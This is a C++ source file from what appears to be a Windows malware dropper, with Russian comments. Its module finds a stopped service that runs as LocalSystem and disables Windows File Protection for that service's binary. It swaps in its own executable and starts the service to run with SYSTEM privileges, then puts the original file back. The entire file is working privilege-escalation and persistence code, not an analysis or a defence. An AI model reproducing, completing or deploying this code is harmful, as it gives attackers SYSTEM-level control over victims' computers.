#include <windows.h>
#include <shlwapi.h>

#include "svc_fuckup.h"
#include "utils.h"
#include "memory.h"
#include "inject.h"
#include "getapi.h"
#include "dprint.h"



typedef BOOL WINAPI _SfcIsFileProtected(IN HANDLE _pRpcHandle,IN LPCWSTR ProtFileName);
typedef DWORD WINAPI _SfcFileException(IN HANDLE _pRpcHandle,IN LPCWSTR ProtFileName,DWORD Mode);
_SfcIsFileProtected *SfcIsFileProtected;
_SfcFileException *SfcFileException;


/*
Краткий алгоритм работы:

FuckupSvc()
- делает EnumServices
- для каждого сервиса со статусом SERVICE_STOPPED - делает TryToFuckup()
- если TryToFuckup() возвращает ОК - прекращаем пробежку по списку


TryToFuckup()
1- получает информацию о сервисе, открыв его с полными правами

2- если для сервиса выполняются правила:
   - StartType не равняется SERVICE_DISABLED
   - путь не содержит "svchost.exe"
   - имя пользователя содержит LocalSystem
   
	 делаем 3, иначе уходим

3- предполагается, что у lpBinaryPathName могут быть параметры, поэтому 
   получаем полный путь к исполняемому файлу сервиса.

4- добавляем файл сервиса в SfcException

5- переименовываем файл сервиса в <path>_ (c:\d\e.exe -> c:\d\e.exe_)

6- копируем себя на место файла сервиса

7 - запускаем и ждем, пока не завершится

8 - удаляем себя

9 - восстанавливаем файл сервиса на старом месте

*/

void ExtractFileName(TCHAR *lpFrom,TCHAR *lpTo)
{
    if ((lpFrom) && (lpTo))
    {
        DWORD dwLen=lstrlen(lpFrom);
        TCHAR *p1=lpFrom+dwLen;
        if (*lpFrom == '\"')
        {
            TCHAR *p=lpFrom+1;
            dwLen--;
            while (*p1 != '\"')
            {
                p1--;
                dwLen--;
            }
            MoveMemory(lpTo,p,dwLen*sizeof(TCHAR));
        }
        else
        {
            while (*p1 != '\\')
                *p1--;
            while (*p1 != ' ')
                *p1++;
            dwLen=p1-lpFrom;
            MoveMemory(lpTo,lpFrom,dwLen*sizeof(TCHAR));
        }
        lpTo[dwLen]=0;
    }
    return;
}

HANDLE CreateSvcFuckupEvent()
{
  SECURITY_ATTRIBUTES sa;
  SECURITY_DESCRIPTOR sd;

  InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
  SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
  
  sa.nLength = sizeof (SECURITY_ATTRIBUTES);
  sa.lpSecurityDescriptor = &sd;
  sa.bInheritHandle = FALSE;

  return ::CreateEvent(&sa, TRUE, FALSE, "Global\\{86B8602B-4009-493C-BC49-F7D767CE95E9}");
}


bool TryToFuckup(SC_HANDLE hSCManager,TCHAR *lpService)
{
	bool bRet=false;
	
	SC_HANDLE hService=OpenService(hSCManager,lpService,SERVICE_ALL_ACCESS);
	PP_DPRINTF(L"TryToFuckup: OpenService('%S') result=0x%X.", lpService, hService);
	if (hService)
	{
		DWORD dwBytesNeeded=0;
		QueryServiceConfig(hService,NULL,0,&dwBytesNeeded);

		LPQUERY_SERVICE_CONFIG lpConfig=(LPQUERY_SERVICE_CONFIG)LocalAlloc(LMEM_FIXED,dwBytesNeeded);
		if (QueryServiceConfig(hService,lpConfig,dwBytesNeeded,&dwBytesNeeded))
		{
			// Добавлена проверка пользователя, из под которого нам 
			// необходимо запускать дропер. 
			// Для нас это LocalSystem
			if ((StrStrI(lpConfig->lpBinaryPathName,TEXT("svchost.exe")) == NULL) && 
				(lpConfig->dwStartType != SERVICE_DISABLED) &&
				(StrStrI(lpConfig->lpServiceStartName,TEXT("LocalSystem")) != NULL)
				)
			{
				PP_DPRINTF(L"TryToFuckup: found service with required rights. binPath='%S'.",
					lpConfig->lpBinaryPathName);

				TCHAR szFileNameWithPathOny[512];
				ExtractFileName(lpConfig->lpBinaryPathName,szFileNameWithPathOny);
				if (GetFileAttributes(szFileNameWithPathOny) != INVALID_FILE_ATTRIBUTES)
				{
					bool bCanInfect=false;
					if ((SfcIsFileProtected) && (SfcIsFileProtected(NULL, (LPWSTR)szFileNameWithPathOny)))
					{
						if ((SfcFileException) && (!SfcFileException(NULL, (LPWSTR)szFileNameWithPathOny,-1)))
							bCanInfect=true;
					}
					else
						bCanInfect=true;

					if (bCanInfect)
					{
						PP_DPRINTF(L"TryToFuckup: SfC exception added. Try to replace by our file");

						TCHAR szSelfName[512],szTmpName[512+2];
						wsprintf(szTmpName,TEXT("%s_"),szFileNameWithPathOny);
						GetModuleFileName(NULL,szSelfName,sizeof(szSelfName)*sizeof(szSelfName[0]));
						if (MoveFile(szFileNameWithPathOny,szTmpName))
						{
							if (CopyFile(szSelfName,szFileNameWithPathOny,TRUE))
							{
								PP_DPRINTF(L"TryToFuckup: File replaced. Starting service.");
								
								HANDLE success_event = CreateSvcFuckupEvent();
								StartService(hService,0,NULL);

								bRet = (WaitForSingleObject(success_event, 5 * 1000) == WAIT_OBJECT_0);

								if (bRet)
								{
									while (true)
									{
										SERVICE_STATUS ssStatus;
										QueryServiceStatus(hService,&ssStatus);
										if (ssStatus.dwCurrentState == SERVICE_STOPPED)
											break;
										Sleep(1);
									}
								}
								PP_DPRINTF(L"TryToFuckup: Original file restoring...");
								while (!DeleteFile(szFileNameWithPathOny)) Sleep(1);
							}
							MoveFile(szTmpName,szFileNameWithPathOny);

							PP_DPRINTF(L"TryToFuckup: Original file restored.");
						}
					}
				}
			}
		}
		CloseServiceHandle(hService);
		LocalFree(lpConfig);
	}
	return bRet;
}

SERVICE_STATUS_HANDLE ssh = NULL;
ServiceMainFunction   svc_main = NULL;
bool                  svc_main_runned = FALSE;

VOID WINAPI SvcFuckupServiceCtrlHandler(DWORD control)
{
	PP_DPRINTF(L"SvcFuckupServiceCtrlHandler: started control=0x%X", control);

	SERVICE_STATUS ss;

	m_memset(&ss, 0, sizeof(ss));

	ss.dwServiceType=SERVICE_WIN32_OWN_PROCESS;
	ss.dwCurrentState=SERVICE_RUNNING;
	ss.dwWin32ExitCode=NO_ERROR;

	PP_DPRINTF(L"SvcFuckupServiceCtrlHandler: set RUNNING status.");
	
	SetServiceStatus(ssh, &ss);
}

void WINAPI SvcFuckupServiceMain(DWORD dwArgc,LPTSTR *lpszArgv)
{
	PP_DPRINTF(L"SvcFuckupServiceMain: RegisterServiceCtrlHandler() with ServiceName='%S'", lpszArgv[0]);

	ssh = RegisterServiceCtrlHandler(lpszArgv[0], &SvcFuckupServiceCtrlHandler);

	SERVICE_STATUS ss={0};
	ss.dwServiceType=SERVICE_WIN32_OWN_PROCESS;
	ss.dwCurrentState=SERVICE_RUNNING;
	ss.dwWin32ExitCode=NO_ERROR;

	PP_DPRINTF(L"SvcFuckupServiceMain: seting RUNNING status.");
	SetServiceStatus(ssh,&ss);

	svc_main_runned = true;
	PP_DPRINTF(L"SvcFuckupServiceMain: calling ServiceMainFunction() = 0x%X", svc_main);
	if (svc_main != NULL) svc_main();

	PP_DPRINTF(L"SvcFuckupServiceMain: ServiceMainFunction() finished.");

	ss.dwServiceType=SERVICE_WIN32_OWN_PROCESS;
	ss.dwCurrentState=SERVICE_STOPPED;
	ss.dwWin32ExitCode=NO_ERROR;

	PP_DPRINTF(L"SvcFuckupServiceMain: setting STOPPED status and finishing.");
	SetServiceStatus(ssh,&ss);
	return;
}

void SvcFuckupDetectCurrentServiceName(CHAR* svc_name_buffer, DWORD svc_name_buffer_length, 
	DWORD * returned_length)
{
	*returned_length = 0;

	SC_HANDLE scm = OpenSCManager(NULL,SERVICES_ACTIVE_DATABASE,SC_MANAGER_ENUMERATE_SERVICE);
	PP_RETURNIF1(scm == NULL);

	DWORD dwResumeHandle=0;

	CHAR  module_name[2 * MAX_PATH];
	DWORD module_name_length = 0;

	module_name_length  = GetModuleFileName(NULL, module_name, ARRAYSIZE(module_name));
	PP_RETURNIF1(module_name_length == ARRAYSIZE(module_name));

	DWORD buffer_length = 2 * 4096;
	PVOID buffer = HeapAlloc(GetProcessHeap(), 0, buffer_length);

	while (true)
	{
		DWORD                       dwBytesNeeded=0;
		DWORD                       dwServicesReturned=0;
		ENUM_SERVICE_STATUS_PROCESS services[200];
		
		BOOL enum_success = EnumServicesStatusEx(scm,
			SC_ENUM_PROCESS_INFO,SERVICE_WIN32,SERVICE_STATE_ALL,
			LPBYTE(services),sizeof(services),&dwBytesNeeded,&dwServicesReturned,
			&dwResumeHandle,NULL);

		for (DWORD n=0; n < dwServicesReturned; n++)
		{
			SC_HANDLE service = OpenService(scm, services[n].lpServiceName, SERVICE_ALL_ACCESS);
			PP_DPRINTF(L"SvcFuckupDetectCurrentServiceName: OpenService('%S') result=0x%X.", services[n].lpServiceName, service);
			
			if (service == NULL) continue;

			LPQUERY_SERVICE_CONFIG config=(LPQUERY_SERVICE_CONFIG)buffer;
			if (QueryServiceConfig(service,config, buffer_length, &dwBytesNeeded))
			{
				if (StrStrI(config->lpBinaryPathName, module_name) != NULL)
				{
					DWORD name_length = (DWORD)plstrlenA(services[n].lpServiceName);

					PP_RETURNIF1(name_length >= (svc_name_buffer_length - 1));
					
					m_memset(svc_name_buffer, 0, svc_name_buffer_length);
					m_memcpy(svc_name_buffer, services[n].lpServiceName, name_length);

					*returned_length = name_length;
					
					PP_DPRINTF(L"SvcFuckupDetectCurrentServiceName: svc found '%S'", svc_name_buffer);
					return;
				}
			}
			
		}
		
		PP_RETURNIF1(enum_success == TRUE);
		PP_RETURNIF1(GetLastError() != ERROR_MORE_DATA);
	}
}

void SvcFuckupRunAsService(ServiceMainFunction service_main)
{
	PP_DPRINTF(L"SvcFuckupRunAsService: notify about start.");

	HANDLE started = CreateSvcFuckupEvent();
	SetEvent(started);

	svc_main = service_main;

	CHAR  service_name[100];
	DWORD service_name_length = 0;

	service_name[0] = '\0';

	SvcFuckupDetectCurrentServiceName(service_name, ARRAYSIZE(service_name), 
		&service_name_length);

	SERVICE_TABLE_ENTRY DispatcherTable[]=
	{
		{ &service_name[0], SvcFuckupServiceMain },
		{ NULL, NULL}
	};

	PP_DPRINTF(L"SvcFuckupRunAsService: StartServiceCtrlDispatcher with '%S' service name.",
		&service_name[0]);

	svc_main_runned = false;
	
	BOOL  result = StartServiceCtrlDispatcher(DispatcherTable);
	DWORD error = GetLastError();
	
	PP_DPRINTF(L"SvcFuckupRunAsService: StartServiceCtrlDispatcher finished (r=%u error=%u runned=%d).",
		result, error, svc_main_runned);

	// Если SCM не отработал - последняя надежда на простой вызов ф-ции.
	PP_DPRINTF(L"SvcFuckupRunAsService: service function not runned. Try last chance run");
	if (!svc_main_runned) service_main();
}

bool SvcFuckupRun()
{
	bool bRet=false;
	HMODULE hSfc=LoadLibrary(TEXT("sfc_os"));
	SfcIsFileProtected=(_SfcIsFileProtected*)GetProcAddress(hSfc,"SfcIsFileProtected");
	SfcFileException=(_SfcFileException *)GetProcAddress(hSfc,(LPCSTR)5);
	SC_HANDLE hSCManager=OpenSCManager(NULL,SERVICES_ACTIVE_DATABASE,SC_MANAGER_ENUMERATE_SERVICE);
	BOOL bSuccess=FALSE;
	
	PP_DPRINTF(L"FuckupSvc: init result sfc_handle=0x%X F1=0x%X F2=0x%X svc_man=0x%X",
		hSfc,
		SfcIsFileProtected,
		SfcFileException,
		hSCManager
		);

	do
	{
		DWORD dwBytesNeeded=0,dwServicesReturned=0,dwResumeHandle=0;
		ENUM_SERVICE_STATUS_PROCESS services[200];
		bSuccess=EnumServicesStatusEx(hSCManager,SC_ENUM_PROCESS_INFO,SERVICE_WIN32,SERVICE_STATE_ALL,LPBYTE(services),sizeof(services),&dwBytesNeeded,&dwServicesReturned,&dwResumeHandle,NULL);

		for (DWORD n=0; n < dwServicesReturned; n++)
		{
			if (services[n].ServiceStatusProcess.dwCurrentState == SERVICE_STOPPED)
			{
				if (TryToFuckup(hSCManager,services[n].lpServiceName))
				{
					bRet=true;
					break;
				}
			}
		}
	}
	while ((!bSuccess) && (GetLastError() == ERROR_MORE_DATA));

	PP_DPRINTF(L"FuckupSvc: finished.");

	CloseServiceHandle(hSCManager);
	return bRet;
}